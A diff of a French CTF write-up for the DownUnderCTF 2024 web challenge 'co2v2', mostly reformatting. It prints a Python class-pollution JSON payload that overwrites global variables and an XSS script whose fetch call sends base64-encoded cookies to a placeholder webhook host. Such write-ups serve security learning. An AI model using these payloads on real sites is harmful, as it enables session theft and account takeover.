@@ -10,7 +10,7 @@ ogImage:
   url: "/assets/blog/hello-world/cover.jpg"
 ---
 
-code : [https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/co2v2/src](https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/co2v2/src)
+[Source du challenge](https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web/co2v2/src)
 
 Ce challenge est la suite de co2 dans laquelle on a trouvé une vulnérabilité de type prototype pollution : [https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution). Cette vulnérabilité nous permettait de réécrire n'importe quelle variable globale à travers la route /save_feedback avec comme payload ```{"__class__":{"__init__":{"__globals__":{"GLOBAL_VAR":"VALUE"}}}}```. Ce payload nous permet de remonter la hiérarchie python jusqu'à tomber sur l'objet __globals__ et ainsi accéder aux dictionnaires des variables globales.
 
@@ -21,4 +21,7 @@ On commence par introduire des simples balises html dans un post pour voir le r�
 On peut passer TEMPLATES_ESCAPE_ALL à False grâce à la vulnérabilité du premier challenge. Cependant, nos balises html ne sont toujours pas interprétés. Le problème est que le moteur de template est chargé une unique fois au démarrage et que la modification de TEMPLATES_ESCAPE_ALL n'est pas suffisante. Il nous faut recharger le moteur de Template avec la modification de notre variable. Heureusement, la route /admin/update-accepted-templates nous permet de faire cette action.
 
 Cette fois ci, les balises html sont interprétés. Pour finir, ils nous suffit d'introduire le script suivant dans un blog post public
-```<script>fetch("http://<webhook>/"+btoa(document.cookie))</script>``` et de trigger la visite du bot xss pour récupérer les cookies et le flag.
+```javascript
+<script>fetch("http://<webhook>/"+btoa(document.cookie))</script>
+```
+ et de trigger la visite du bot xss pour récupérer les cookies et le flag.
